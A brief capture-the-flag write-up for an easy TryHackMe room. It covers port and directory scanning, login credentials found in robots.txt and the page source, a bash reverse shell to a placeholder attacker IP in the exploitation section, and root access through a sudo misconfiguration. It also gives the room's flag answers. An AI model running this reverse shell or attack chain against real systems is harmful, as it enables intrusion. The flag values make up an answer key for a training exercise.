# [Room Name] - TryHackMe

**Difficulty:** Easy | **Date:** 11/01/2026

---

## Recon

```bash
# Port scan
rustscan -a TARGET_IP -r 1-65535 -t 1000
nmap -sC -sV -p 22,80 TARGET_IP

# Results: 22 (SSH), 80 (HTTP)
```

---

## Enumeration

```bash
# Directory scan
feroxbuster -u http://TARGET_IP -w ~/SecLists/Discovery/Web-Content/common.txt -x php,html

# Key findings:
# - /robots.txt → Wubbalubbadubdub
# - /index.html source → Username: R1ckRul3s
# - /login.php → Login panel
```

**Credentials:** `R1ckRul3s:Wubbalubbadubdub`

---

## Exploitation

```bash
# Command panel'de reverse shell
bash -c 'exec bash -i &>/dev/tcp/YOUR_IP/4444 <&1'

# Listener
nc -lvnp 4444
```

**Flag 1:** `/var/www/html/Sup3rS3cretPickl3Ingred.txt` → `mr. meeseek hair`

**Flag 2:** `/home/rick/second ingredients` → `1 jerry tear`

---

## Privilege Escalation

```bash
sudo -l
# (ALL) NOPASSWD: ALL

sudo su -
```

**Flag 3:** `/root/3rd.txt` → `fleeb juice`

---

## Summary

- Found creds in robots.txt + page source
- RCE via web command panel
- Sudo misconfiguration → root access
